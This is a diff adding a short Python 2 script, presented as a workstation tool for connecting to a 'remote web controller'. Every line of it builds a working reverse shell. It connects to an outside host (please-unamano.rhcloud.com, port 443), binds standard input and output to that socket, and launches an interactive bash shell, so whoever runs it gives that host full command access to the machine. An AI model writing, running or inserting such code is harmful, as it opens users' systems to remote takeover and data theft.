@@ -1,0 +1,25 @@
+#!/usr/bin/python
+# Unamano workstation script
+# Run to connect to remote web controller
+
+import socket,subprocess,os
+
+UNAMANO_SERVER="please-unamano.rhcloud.com"
+UNAMANO_PORT=443
+
+print "Connecting...",
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((UNAMANO_SERVER,UNAMANO_PORT))
+
+print "OK"
+
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+
+hostname=socket.gethostname()
+print "Workstation "+hostname+" under remote control"
+
+p=subprocess.call(["/bin/bash","-i"])
+
